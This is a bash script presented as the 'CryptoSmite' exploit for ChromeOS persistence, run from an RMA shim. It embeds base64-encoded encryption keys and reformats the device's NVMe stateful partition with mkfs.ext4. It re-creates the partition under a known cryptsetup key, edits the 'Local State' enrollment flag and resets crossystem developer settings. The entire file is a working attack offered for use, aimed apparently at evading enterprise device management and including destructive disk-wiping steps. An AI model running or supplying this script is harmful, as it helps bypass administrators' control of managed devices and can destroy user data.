#!/bin/bash
# [THIS IS A SERIOUS EXPLOIT. IT ALLOWS FOR CHROMEOS PERSISTENCE]
# Run this on a rma shim.

# Encryption keys related to CryptoSmite
packedkey () {
    cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
    return;
}

# Local State EnrollmentRecoveryRequired
err_exploit () {
    echo "Editing the err in Local State";
}
LOCALSTATEMOD=0

#Definitely not taken from the chromium source code
# Get destination hard drive
get_largest_nvme_namespace() { 
  local largest size tmp_size dev
  size=0
  dev=$(basename "$1")

  for nvme in /sys/block/"${dev%n*}"*; do
    tmp_size=$(cat "${nvme}"/size)
    if [ "${tmp_size}" -gt "${size}" ]; then
      largest="${nvme##*/}"
      size="${tmp_size}"
    fi
  done
  echo "${largest}"
}

#Cryptosmite encryption key for file system
packedecryptfs() {
    cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
return;
}

# Embed cryptsetup in shim functions
cryptsetupx() {
    mount --bind /dev /mnt/shim_stateful/cryptsetup_root/dev
    mount --bind /proc /mnt/shim_stateful/cryptsetup_root/proc
    mount --bind /sys /mnt/shim_stateful/cryptsetup_root/sys
    mount --bind /mnt/sp1 /mnt/shim_stateful/cryptsetup_root/mnt
    packedecryptfs > /mnt/shim_stateful/cryptsetup_root/enc.key
    echo "You may now see the encryption key that is used to create the stateful partition. Check cryptsetup_root"
    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
echo "Using cryptsetup..."
cryptsetup open --key-file /enc.key --type plain /mnt/encrypted.block enc
EOF
    chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh
    if [ ${LOCALSTATEMOD} -gt 0 ]
    then
        echo "Skipping erasing encrypted partition"
    else
        mkfs.ext4 /dev/mapper/enc
    fi
    
    mkdir -p /mnt/stateful
    mount -o loop,"${1}",noload /dev/mapper/enc /mnt/stateful
    
}
cryptsetupendx() {
    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
echo "Cleaning up cryptsetup mount"
cryptsetup close enc
EOF
    chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh
    umount /mnt/shim_stateful/cryptsetup_root/mnt


}
getstage2() {
    cat <<EOF >> /mnt/encrypted_block/stage2.sh

EOF
}
endstage2() {
    cat <<EOF >> /mnt/encrypted_block/endstage2.sh
echo "Cleaning up Stage II"
echo "Unmounting enc-block"
umount 
cryptsetup close /dev/mapper/enc
EOF
}
createfilewithsize() {
    dd if=/dev/urandom of=$1 count=1 bs=$2
}
{
if [ $# -gt 0 ]
then
    echo "Editing local state information to remove FWMP"
    LOCALSTATEMOD=1
fi
mkdir /mnt/shim_stateful
mount -o loop,rw /dev/disk/by-label/shimstate /mnt/shim_stateful
mkdir -p /mnt/sp1
if [ ${LOCALSTATEMOD} -gt 0 ] 
then
    LOOPDEV=$(losetup -o 0 --find --show "/dev/$(get_largest_nvme_namespace)p1")

    mount -o ro $LOOPDEV /mnt/sp1
    cryptsetupx ro
    echo "Backing up original stateful to shim_stateful"
    cd /mnt/stateful
    mkdir -p /mnt/shim_stateful/$(dirname ${1})
    # Command below should backup encrypted stateful to the shim stateful with our known key, and the path provided as parameter #1. 
    tar -cvf /mnt/shim_stateful/${1} . 
    echo "Backed up now, continuing..."
    cd
    umount /mnt/stateful
    cryptsetupendx
    losetup -D
fi
umount /mnt/sp1
losetup -D
mkfs.ext4 "/dev/$(get_largest_nvme_namespace)p1" 
mount -o loop,rw "/dev/$(get_largest_nvme_namespace)p1" /mnt/sp1
cd /mnt/sp1

if [ -f /mnt/sp1/encrypted.key ]
then
    rm -f /mnt/sp1/encrypted.key
fi
echo "Using the key packed with cryptosmite. It will be a key you generate later."
packedkey > encrypted.needs-finalization
echo "Finding cryptsetup.tar.xz at /usr/local/cryptsetup.tar.xz"
# we erase before getting here anyways
#rm /mnt/sp1/encrypted.block
dd if=/dev/zero of=/mnt/sp1/encrypted.block bs=1M count=1024 status=progress # Hopefully 1GB is good enough

cryptsetupx rw

#Ed your stateful in bash terminal
echo "Edit your stateful here in /mnt/stateful and exit to save changes"
if [ ${LOCALSTATEMOD} -gt 0 ]
then
    echo "Running sed command on Local State"
    echo "Extracting stateful backup"
    tar -xvf /mnt/shim_stateful/stateful_bak.tar.xz -C /mnt/stateful
    sed -i 's/\"EnrollmentRecoveryRequired\":false/\"EnrollmentRecoveryRequired\":true/g' /mnt/stateful/chronos/Local\ State
    echo "DO NOT RUN THE TAR COMMAND, INSTEAD EXIT THE SHELL UNLESS YOU NEED TO MODIFY SOMETHING ELSE"
fi
su -p -c "bash -i"

#Clean ups
umount /mnt/stateful
cryptsetupendx
crossystem disable_dev_request=1
crossystem disable_dev_request=1 # grunt weirdness
echo "SMITED SUCCESSFULLY!"
echo "Rebooting in 3 seconds"
sleep 3
reboot -f
} || {
    echo "Cleaing up, exploit failed"
    umount /mnt/sp1
    exit 0
}
